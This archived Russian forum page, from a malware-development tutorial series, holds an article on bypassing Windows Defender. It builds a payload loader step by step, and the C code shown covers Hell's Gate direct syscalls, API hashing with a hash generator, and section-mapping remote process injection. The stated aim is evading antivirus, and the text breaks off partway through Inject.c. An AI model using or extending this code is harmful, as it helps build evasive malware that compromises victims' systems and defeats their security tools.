ya-page_js_yes';}s.type='text/javascript';s.async=true;s.charset='utf-8';s.src=(d.location.protocol==='https:'?'https:':'http:')+'//site.yandex.net/v2.0/js/all.js';h.parentNode.insertBefore(s,h);(w[c]||(w[c]=[])).push(function(){Ya.Site.Form.init()})})(window,document,'yandex_site_callbacks');</script>
      <!-- Notice -->
      <p style="margin:15px 0 0;
                padding:10px;
                border-radius:6px;
                background:#ffeaea;
                color:#c0392b;
                font-weight:bold;
                text-align:center;">
        ⚠️ Это архив форума, в ближайшее время поддержка ресурса не планируется!
      </p>

    </div>
  </div>
</div>
		</div>
	</li>

			
		</ul>
	

			

			

			
			
	
		<ul class="p-breadcrumbs "
			itemscope itemtype="https://schema.org/BreadcrumbList">
			
				

				
				

				

				
				
					
					
	<li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
		<a href="../../../categories/uroki-razrabotki-vredonosnogo-softa.2/index.html" itemprop="item">
			<span itemprop="name">Уроки разработки вредоносного софта</span>
		</a>
		<meta itemprop="position" content="1" />
	</li>

				
			
		</ul>
	

			

			
	<noscript class="js-jsWarning"><div class="blockMessage blockMessage--important blockMessage--iconic u-noJsOnly">JavaScript отключён. Для полноценно использования нашего сайта, пожалуйста, включите JavaScript в своём браузере.</div></noscript>

			
	<div class="blockMessage blockMessage--important blockMessage--iconic js-browserWarning" style="display: none">Вы используете устаревший браузер. Этот и другие сайты могут отображаться в нем неправильно.<br />Необходимо обновить браузер или попробовать использовать <a href="https://www.google.com/chrome/" target="_blank" rel="noopener">другой</a>.</div>


			
				<div class="p-body-header">
					
		<div class="contentRow contentRow--hideFigureNarrow">
			<div class="contentRow-main">
				<div class="p-title">
					<h1 class="p-title-value">
						
							
							Цикл статей &quot;Изучение вредоносных программ&quot;
						
					</h1>
				</div>
				
					<div class="p-description">
						
							<ul class="listInline listInline--bullet">
								<li>
									<i class="fa--xf far fa-user "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Автор</title><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#user"></use></svg></i>
									<span class="u-srOnly">Автор</span>
									
										<a href="https://osint42.org/members/0x42.1/" class="username  u-concealed" dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a>
									
								</li>
								
								<li>
									<i class="fa--xf far fa-clock "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Дата публикации</title><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#clock"></use></svg></i>
									<span class="u-srOnly">Дата публикации</span>

									<a href="../../index.html" class="u-concealed"><time  class="u-dt" dir="auto" datetime="2025-05-08T13:54:22+0300" data-timestamp="1746701662" data-date="08.05.2025" data-time="13:54" data-short="8 Май" title="08.05.2025 в 13:54">08.05.2025</time></a>
								</li>
																
									<li>
										<i class="fa--xf far fa-clock "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Последнее обновление</title><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#clock"></use></svg></i>
										<span class="u-concealed">Обновлено</span>

										<time  class="u-dt" dir="auto" datetime="2025-05-09T16:44:30+0300" data-timestamp="1746798270" data-date="09.05.2025" data-time="16:44" data-short="9 Май" title="09.05.2025 в 16:44">09.05.2025</time>
									</li>
								
																
									<li>
										<i class="fa--xf far fa-hourglass "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Article read time</title><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#hourglass"></use></svg></i>
										<span class="u-srOnly">Article read time</span>

										398 min read
									</li>
								
								
								
									<li><span class="label label--accent">Рекомендуемые</span></li>
								
							</ul>
						
					</div>
				

				

	
		
	

			</div>
		</div>
	
				</div>
				

			<div class="p-body-main p-body-main--withSidebar ">
				
				<div class="p-body-contentCol"></div>
				
					<div class="p-body-sidebarCol"></div>
				

				

				<div class="p-body-content">
					
					<div class="p-body-pageContent">









	

	



	
	

	




	




	







	



	




	
	
		
	
	
	


	
	
		
	
	
	


	
	
		
	
	
	


	
	
		
	
	
	


	
	
		
	
	
	


	
	
		
	
	
	


	







	
		
		

		
			<script data-cfasync="false" src="../../../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script class="js-extraPhrases" type="application/json">
			{
				"lightbox_close": "Закрыть",
				"lightbox_next": "Следующая",
				"lightbox_previous": "Предыдущая",
				"lightbox_error": "Запрошенный контент не может быть загружен. Пожалуйста, попробуйте позже.",
				"lightbox_start_slideshow": "Запустить слайд-шоу",
				"lightbox_stop_slideshow": "Остановить слайд-шоу",
				"lightbox_full_screen": "Полный экран",
				"lightbox_thumbnails": "Миниатюры",
				"lightbox_download": "Скачать",
				"lightbox_share": "Поделиться",
				"lightbox_zoom": "Увеличить",
				"lightbox_new_window": "Новое окно",
				"lightbox_toggle_sidebar": "Переключить боковую панель"
			}
			</script>
		
		
	


<div class="block">
	
		<div class="block-outer">
			<div class="block-outer-opposite">
			
				

	

	

	

	

	

	

	

	
		<div class="buttonGroup">
		
			

			
			
			
			

	

			
			
				<div class="buttonGroup-buttonWrapper">
					<button type="button" class="button button--link menuTrigger" data-xf-click="menu" aria-expanded="false" aria-haspopup="true" title="Навигация по страницам"><span class="button-text">
						ОГЛАВЛЕНИЕ
					</span></button>
					<div class="menu" data-menu="menu" aria-hidden="true">
						<div class="menu-content">
							<h4 class="menu-header">Выберите страницу</h4>

							<a href="../../index.html" class="menu-linkRow ">
								
									Зачем изучать разработку вредоносных программ ?
								
							</a>

							
								
									<a href="../instrumenty.1/index.html" class="menu-linkRow ">
									 Инструменты</a>
								
									<a href="../tak-kakoi-zhe-yazyk-vybrat.2/index.html" class="menu-linkRow ">
									 Так какой-же язык выбрать !?</a>
								
									<a href="../shpargalka-po-arkhitekture-vindy.3/index.html" class="menu-linkRow ">
									 Шпаргалка по архитектуре винды</a>
								
									<a href="../chto-takoye-payload-i-shell-code.5/index.html" class="menu-linkRow ">
									 Что такое payload и shell code</a>
								
									<a href="../izuchayem-dinamicheskiye-biblioteki.6/index.html" class="menu-linkRow ">
									 Изучаем динамические библиотеки</a>
								
									<a href="../protsessy-windows.7/index.html" class="menu-linkRow ">
									 Процессы Windows</a>
								
									<a href="../vidy-detektov.8/index.html" class="menu-linkRow ">
									 Виды детектов</a>
								
									<a href="../kuda-klast-nagruzku.9/index.html" class="menu-linkRow ">
									 Куда класть нагрузку ?</a>
								
									<a href="../shifruyem-payload.10/index.html" class="menu-linkRow ">
									 Шифруем Payload</a>
								
									<a href="../obfuskatsiya-payload.11/index.html" class="menu-linkRow ">
									 Обфускация Payload</a>
								
									<a href="../lokal-nyi-zapusk-payload.12/index.html" class="menu-linkRow ">
									 Локальный запуск Payload</a>
								
									<a href="../in-yektsiya-v-protsess.13/index.html" class="menu-linkRow ">
									 Иньекция в процесс</a>
								
									<a href="../in-yektsiya-shell-koda-v-protsess.14/index.html" class="menu-linkRow ">
									 Инъекция шелл-кода в процесс</a>
								
									<a href="../razmeshchayem-payload-udalenno-na-servere.15/index.html" class="menu-linkRow ">
									 Размещаем Payload удаленно на сервере</a>
								
									<a href="../pryachem-payload-v-reyestre.16/index.html" class="menu-linkRow ">
									 Прячем Payload в реестре</a>
								
									<a href="../razborka-s-tsifrovoi-podpis-yu-zver-ka.17/index.html" class="menu-linkRow ">
									 Разборка с цифровой подписью зверька</a>
								
									<a href="../izuchayem-tekhniku-thread-hijacking.18/index.html" class="menu-linkRow ">
									 Изучаем технику Thread Hijacking</a>
								
									<a href="../opredeleniye-pid-nuzhnogo-protsessa-ili-perechisleniya-protsessov.19/index.html" class="menu-linkRow ">
									 Определение PID нужного процесса, или перечисления процессов</a>
								
									<a href="../izuchayem-tekhniku-apc-injection.20/index.html" class="menu-linkRow ">
									 Изучаем технику APC Injection</a>
								
									<a href="../vyzov-koda-cherez-funktsii-obratnogo-vyzova.21/index.html" class="menu-linkRow ">
									 Вызов кода через функции обратного вызова</a>
								
									<a href="../in-yektsiya-otobrazhayemoi-pamyati.22/index.html" class="menu-linkRow ">
									 Инъекция отображаемой памяти</a>
								
									<a href="../izuchayem-tekhniku-stomping-injection.23/index.html" class="menu-linkRow ">
									 Изучаем технику Stomping Injection</a>
								
									<a href="../kontrol-vypolneniya-poleznoi-nagruzki.24/index.html" class="menu-linkRow ">
									 Контроль выполнения полезной нагрузки</a>
								
									<a href="../izuchayem-tekhniku-spoofing.25/index.html" class="menu-linkRow ">
									 Изучаем технику Spoofing</a>
								
									<a href="../skrytiye-strok.26/index.html" class="menu-linkRow ">
									 Скрытие строк</a>
								
									<a href="../izuchayem-kungfu-1-skrytiye-tablitsy-importa.27/index.html" class="menu-linkRow ">
									 Изучаем кунгфу-1. Скрытие таблицы импорта</a>
								
									<a href="../kungfu-2-izuchayem-api-hooking.28/index.html" class="menu-linkRow ">
									 Кунгфу-2.Изучаем API Hooking</a>
								
									<a href="../predel-naya-tekhnika-razborka-s-siskolami.29/index.html" class="menu-linkRow ">
									 Предельная техника. Разборка с сисколами</a>
								
									<a href="../predel-naya-tekhnika-2-praktika-realizuyem-tekhniki-in-yektsii-cherez-siskoly.30/index.html" class="menu-linkRow ">
									 Предельная техника-2. Практика. Реализуем техники инъекции через сисколы</a>
								
									<a href="../cherpayem-sily-v-antiotladke.31/index.html" class="menu-linkRow ">
									 Черпаем силы в антиотладке</a>
								
									<a href="../obkhod-virtual-nykh-mashin.32/index.html" class="menu-linkRow ">
									 Обход виртуальных машин</a>
								
									<a href="../otkryvayem-vrata-ada.33/index.html" class="menu-linkRow ">
									 Открываем врата ада</a>
								
									<a href="../umen-sheniye-veroyatnosti-detekta-zver-ka.34/index.html" class="menu-linkRow ">
									 Уменьшение вероятности детекта зверька</a>
								
									<a href="index.html" class="menu-linkRow is-selected">
									 Обход Windows defender</a>
								
									<a href="../pro-endpoint-detection-and-response-edr.36/index.html" class="menu-linkRow ">
									 Про Endpoint Detection and Response (EDR)</a>
								
									<a href="../pro-detekt-v-pamyati-nichego-ne-podelayesh-i-eto-neizbezhno.37/index.html" class="menu-linkRow ">
									 Про детект в памяти. Ничего не поделаешь и это неизбежно)</a>
								
									<a href="../ogromnaya-baza-iskhodnikov-sovremennykh-virusov-dlya-raznykh-platform.38/index.html" class="menu-linkRow ">
									 Огромная база исходников современных вирусов для разных платформ</a>
								
									<a href="../kak-rootkit-zagruzit-ili-zhe-kak-zagruzit-draiver-bez-podpisi.39/index.html" class="menu-linkRow ">
									 Как RootKit загрузить или же как загрузить драйвер без подписи</a>
								
									<a href="../obkhod-amsi.40/index.html" class="menu-linkRow ">
									 Обход AMSI</a>
								
									<a href="../obkhod-amsi-pri-pomoshchi-khardvarnykh-tochek-ostanova.41/index.html" class="menu-linkRow ">
									 Обход AMSI при помощи хардварных точек останова</a>
								
									<a href="../uklonyayemsya-ot-povedencheskogo-detekta-antivirusa-i-edr.42/index.html" class="menu-linkRow ">
									 Уклоняемся от поведенческого детекта антивируса и EDR</a>
								
									<a href="../obkhodim-antivirusy-i-edr.43/index.html" class="menu-linkRow ">
									 Обходим антивирусы и EDR</a>
								
									<a href="../mutationgate-novyi-podkhod-raboty-s-siskolami.44/index.html" class="menu-linkRow ">
									 MutationGate - Новый подход работы с сисколами</a>
								
									<a href="../razrabotka-nastoyashchego-virusa-v-2024-godu.45/index.html" class="menu-linkRow ">
									 Разработка настоящего вируса в 2024 году</a>
								
							
							
								<a href="../../index9401.html?full=1" class="menu-linkRow ">Просмотреть всю статью</a>
							
						</div>
					</div>
				</div>
			

			

			
		
		</div>
	

			
			</div>
		</div>
	

	
	
	
	
		

	<div class="block-container">
		<div class="block-body lbContainer js-articleBody"
			data-xf-init="lightbox"
			data-lb-id="article-6"
			data-lb-caption-desc="0x42 &middot; 08.05.2025 в 13:54"
			id="js-articleBody-6">

			<div class="articleBody">
				<article class="articleBody-main js-lbContainer">
					
					

					<h2>Обход Windows defender</h2>

					

						

					<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746788137329.png"
		data-src="https://osint42.org/attachments/1746788137329-png.261/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746788137329-png.261/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788137329.png"
			title="1746788137329.png"
			width="688" height="384" loading="lazy" />
	</div><br />
<br />
<b>Введение</b><br />
<br />
До сих пор было продемонстрировано множество методов и техник создания и выполнения загрузчика payload, который может обходить различные программы защиты от вредоносного кода. Эта статья будет работать над созданием полнофункционального загрузчика payload с нуля, чтобы укрепить знания, полученные в предыдущих разделах.<br />
<br />
Создайте пустой проект Visual Studio и следуйте за этим разделом.<br />
<br />
<b>Характеристики загрузчика payload </b><br />
<br />
Реализованный загрузчик payload будет иметь следующие характеристики:<br />
<br />
<ul>
<li data-xf-list-type="ul">Поддержка удаленного внедрения кода</li>
<li data-xf-list-type="ul">Инжекция с использованием прямых системных вызовов через Hell&#039;s Gate</li>
<li data-xf-list-type="ul">Хеширование API</li>
<li data-xf-list-type="ul">Функции против анализа</li>
<li data-xf-list-type="ul">Шифрование payload RC4</li>
<li data-xf-list-type="ul">Попытка взлома ключа шифрования (Брут ключа шифрования)</li>
<li data-xf-list-type="ul">Отсутствие импорта библиотек CRT</li>
</ul><br />
<b>Настройка Hell&#039;s Gate</b><br />
<br />
Этот загрузчик использует внедрение payload с использованием прямых системных вызовов, полученных с помощью Hell&#039;s Gate.<br />
Для начала необходимо создать файлы Structs.h, HellsGate.c и HellAsm.asm.<br />
<br />
В этих файлах содержатся необходимые функции для выполнения прямых системных вызовов. Файл Structs.h используется для сохранения недокументированных структур Windows и включается в последующие файлы C. В нем содержатся определения структур, таких как PEB, TEB и другие, необходимых для реализации Hell&#039;s Gate.<br />
<br />
Файл HellAsm.asm <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/hellsgate.asm" target="_blank" class="link link--external" rel="noopener">будет таким же, как в репозитории.</a> Что касается HellsGate.c, в нем будут следующие функции.<br />
<br />
HellsGate.c<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &quot;Structs.h&quot;

PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
    return (PTEB)__readgsqword(0x30);
#else
    return (PTEB)__readfsdword(0x16);
#endif
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
    // Получить заголовок DOS
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pImageDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    // Получить заголовки NT
    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader-&gt;e_lfanew);
    if (pImageNtHeaders-&gt;Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }

    // Получить EAT
    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders-&gt;OptionalHeader.DataDirectory[0].VirtualAddress);
    return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNameOrdinals);

    for (WORD cx = 0; cx &lt; pImageExportDirectory-&gt;NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (djb2(pczFunctionName) == pVxTableEntry-&gt;uHash) {
            pVxTableEntry-&gt;pAddress = pFunctionAddress;

            // Быстрое и грязное исправление, если функция была перехвачена
            WORD cw = 0;
            while (TRUE) {
                // Проверить, является ли это системным вызовом, в этом случае мы слишком далеко
                if (*((PBYTE)pFunctionAddress + cw) == 0x0f &amp;&amp; *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
                    return FALSE;

                // Проверить, является ли это возвратом, в этом случае, возможно, мы тоже слишком далеко
                if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
                    return FALSE;

                // Первые байты должны быть:
                //    MOV R10, RCX
                //    MOV RCX, &lt;syscall&gt;
                if (*((PBYTE)pFunctionAddress + cw) == 0x4c
                    &amp;&amp; *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
                    &amp;&amp; *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
                    &amp;&amp; *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
                    &amp;&amp; *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
                    &amp;&amp; *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
                    BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
                    BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
                    pVxTableEntry-&gt;wSystemCall = (high &lt;&lt; 8) | low;
                    break;
                }

                cw++;
            };
        }
    }

    if (pVxTableEntry-&gt;wSystemCall != NULL)
        return TRUE;
    else
        return FALSE;
}</code></pre>
	</div>
</div><br />
Код выше не имеет определения структуры VX_TABLE_ENTRY или функции djb2. Для решения этой проблемы будут созданы два новых файла: WinApi.c и Common.h.<br />
<br />
WinApi.c - Этот файл используется для хранения функций замены библиотеки CRT и функций хеширования строк, используемых в Hell&#039;s Gate и реализации хеширования API.<br />
<br />
Common.h - Этот файл предоставляет общие прототипы функций для возможности вызова функции из другого файла, а также пользовательские определения структур, значения хешей системных вызовов и WinAPI.<br />
<br />
Функция хеширования строк djb2 заменяется следующими функциями HashStringJenkinsOneAtATime32BitA/W, изменяя таким образом исходный алгоритм хеширования строк, используемый в Hell&#039;s Gate.<br />
<br />
WinApi.c<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &quot;Structs.h&quot;
#include &quot;Common.h&quot;

UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String)
{
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenA(String);

    while (Index != Length)
    {
        Hash += String[Index++];
        Hash += Hash &lt;&lt; INITIAL_SEED;
        Hash ^= Hash &gt;&gt; 6;
    }

    Hash += Hash &lt;&lt; 3;
    Hash ^= Hash &gt;&gt; 11;
    Hash += Hash &lt;&lt; 15;

    return Hash;
}

UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String)
{
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenW(String);

    while (Index != Length)
    {
        Hash += String[Index++];
        Hash += Hash &lt;&lt; INITIAL_SEED;
        Hash ^= Hash &gt;&gt; 6;
    }

    Hash += Hash &lt;&lt; 3;
    Hash ^= Hash &gt;&gt; 11;
    Hash += Hash &lt;&lt; 15;

    return Hash;
}</code></pre>
	</div>
</div><br />
<b>Common.h</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#pragma once
#include &lt;Windows.h&gt;

// Начальное значение для функции хеширования HashStringJenkinsOneAtATime32BitA/W в &#039;WinApi.c&#039;
#define INITIAL_SEED    8

UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String);

#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))

// Это прототипы функций - функции определены в &#039;HellsGate.c&#039;
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory);
BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry);

// Это прототипы функций - функции определены в &#039;HellAsm.asm&#039;
extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();</code></pre>
	</div>
</div><br />
Определите структуру VX_TABLE_ENTRY в файле Common.h, а затем обновите файл HellsGate.c, чтобы включить ее и использовать HASHA вместо djb2 в качестве функции хеширования.<br />
<br />
VX_TABLE_ENTRY<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>typedef struct _VX_TABLE_ENTRY {
    PVOID   pAddress;
    UINT32  uHash;
    WORD    wSystemCall;
} VX_TABLE_ENTRY, *PVX_TABLE_ENTRY;</code></pre>
	</div>
</div><br />
<b>Вычисление хешей системных вызовов</b><br />
<br />
Для вычисления значений хешей системных вызовов и вывода их на консоль необходимо создать новый проект. Проект Hasher будет содержать один файл на C, который показан ниже.<br />
<br />
Hasher.c<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;

#define STR &quot;_JOAA&quot;
#define INITIAL_SEED 8

UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String)
{
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenA(String);

    while (Index != Length)
    {
        Hash += String[Index++];
        Hash += Hash &lt;&lt; INITIAL_SEED;
        Hash ^= Hash &gt;&gt; 6;
    }

    Hash += Hash &lt;&lt; 3;
    Hash ^= Hash &gt;&gt; 11;
    Hash += Hash &lt;&lt; 15;

    return Hash;
}

UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String)
{
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenW(String);

    while (Index != Length)
    {
        Hash += String[Index++];
        Hash += Hash &lt;&lt; INITIAL_SEED;
        Hash ^= Hash &gt;&gt; 6;
    }

    Hash += Hash &lt;&lt; 3;
    Hash ^= Hash &gt;&gt; 11;
    Hash += Hash &lt;&lt; 15;

    return Hash;
}

int main() {

    printf(&quot;#define %s%s \t0x%0.8X \n&quot;, &quot;NtCreateSection&quot;, STR, HashStringJenkinsOneAtATime32BitA(&quot;NtCreateSection&quot;));
    printf(&quot;#define %s%s \t0x%0.8X \n&quot;, &quot;NtMapViewOfSection&quot;, STR, HashStringJenkinsOneAtATime32BitA(&quot;NtMapViewOfSection&quot;));
    printf(&quot;#define %s%s \t0x%0.8X \n&quot;, &quot;NtUnmapViewOfSection&quot;, STR, HashStringJenkinsOneAtATime32BitA(&quot;NtUnmapViewOfSection&quot;));
    printf(&quot;#define %s%s \t0x%0.8X \n&quot;, &quot;NtClose&quot;, STR, HashStringJenkinsOneAtATime32BitA(&quot;NtClose&quot;));
    printf(&quot;#define %s%s \t0x%0.8X \n&quot;, &quot;NtCreateThreadEx&quot;, STR, HashStringJenkinsOneAtATime32BitA(&quot;NtCreateThreadEx&quot;));
    printf(&quot;#define %s%s \t0x%0.8X \n&quot;, &quot;NtWaitForSingleObject&quot;, STR, HashStringJenkinsOneAtATime32BitA(&quot;NtWaitForSingleObject&quot;));

    return 0;
}</code></pre>
	</div>
</div><br />
<b>Результаты Hasher</b><br />
<br />
После компиляции и запуска программа сгенерирует следующие результаты, которые следует скопировать в файл Common.h.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788161753.png"
		data-src="https://osint42.org/attachments/1746788161753-png.262/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746788161753-png.262/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788161753.png"
			title="1746788161753.png"
			width="1048" height="194" loading="lazy" />
	</div><br />
<br />
Дополнительно, определение структуры новой структуры VX_TABLE должно быть обновлено, чтобы включить системные вызовы, которые будут использоваться.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _VX_TABLE {

    VX_TABLE_ENTRY NtCreateSection;
    VX_TABLE_ENTRY NtMapViewOfSection;
    VX_TABLE_ENTRY NtUnmapViewOfSection;
    VX_TABLE_ENTRY NtClose;
    VX_TABLE_ENTRY NtCreateThreadEx;
    VX_TABLE_ENTRY NtWaitForSingleObject;

} VX_TABLE, * PVX_TABLE;</code></pre>
	</div>
</div><br />
<b>Внедрение Payload через Hell&#039;s Gate</b><br />
<br />
После успешной настройки Hell&#039;s Gate можно приступить к внедрению Payload. Создается новый файл Inject.c, который представлен ниже.<br />
<br />
<b>Следующие пункты кратко объясняют файл Inject.c:</b><br />
<ol>
<li data-xf-list-type="ol">InitializeSyscalls - Эта функция инициализирует глобальную переменную g_Sys типа VX_TABLE, которая будет использоваться позже.</li>
<li data-xf-list-type="ol">RemoteMappingInjectionViaSyscalls - Эта функция поддерживает как локальное, так и удаленное инъекцию через параметр bLocal, который устанавливается в TRUE для локальной инъекции и в FALSE для удаленной инъекции.</li>
<li data-xf-list-type="ol">Если параметр bLocal установлен в TRUE, переменная dwLocalFlag будет установлена в PAGE_EXECUTE_READWRITE, чтобы быть подходящей для локального выполнения Payload, и второй вызов NtMapViewOfSection будет избегаться. Но если bLocal установлен в FALSE, dwLocalFlag останется PAGE_READWRITE, и функция выполнит второй вызов NtMapViewOfSection для выделения памяти удаленно.</li>
<li data-xf-list-type="ol">Переменная pExecAddress используется для сохранения базового адреса внедренного Payload. Она равна базовому адресу локально внедренного Payload (pLocalAddress), если функция настроена на выполнение Payload локально, или базовому адресу удаленно внедренного Payload (pRemoteAddress), если функция настроена на выполнение Payload удаленно.</li>
<li data-xf-list-type="ol">Переменная pExecAddress затем передается в системный вызов NtCreateThreadEx для выполнения Payload в нужный момент времени.</li>
</ol>
	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;
#include &quot;Structs.h&quot;
#include &quot;Common.h&quot;

// Глобальная структура VX_TABLE
VX_TABLE g_Sys = { 0 };

BOOL InitializeSyscalls() {

    // Получить PEB
    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;
    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-&gt;OSMajorVersion != 0xA)
        return FALSE;

    // Получить модуль NTDLL
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

    // Получить EAT NTDLL
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(pLdrDataEntry-&gt;DllBase, &amp;pImageExportDirectory) || pImageExportDirectory == NULL)
        return FALSE;

    g_Sys.NtCreateSection.uHash = NtCreateSection_JOAA;
    g_Sys.NtMapViewOfSection.uHash = NtMapViewOfSection_JOAA;
    g_Sys.NtUnmapViewOfSection.uHash = NtUnmapViewOfSection_JOAA;
    g_Sys.NtClose.uHash = NtClose_JOAA;
    g_Sys.NtCreateThreadEx.uHash = NtCreateThreadEx_JOAA;
    g_Sys.NtWaitForSingleObject.uHash = NtWaitForSingleObject_JOAA;

    // Инициализировать системные вызовы
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtCreateSection))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtMapViewOfSection))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtUnmapViewOfSection))
        return FALSE;
